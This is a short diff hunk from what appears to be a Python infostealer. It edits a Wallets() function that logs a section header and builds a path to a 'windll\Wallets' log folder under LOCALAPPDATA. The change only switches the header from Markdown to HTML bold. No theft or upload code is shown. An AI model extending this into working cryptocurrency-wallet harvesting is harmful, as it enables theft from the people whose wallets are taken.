@@ -19,7 +19,7 @@ import shutil
 def Wallets():
     msgInfo = ""
     Log("===========Wallets===========")
-    msgInfo+="\n\n\n**💰Wallets💰**"
+    msgInfo+="\n\n\n<b>💰Wallets💰</b>"
     roaming = os.getenv('APPDATA')
     pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Wallets"
 
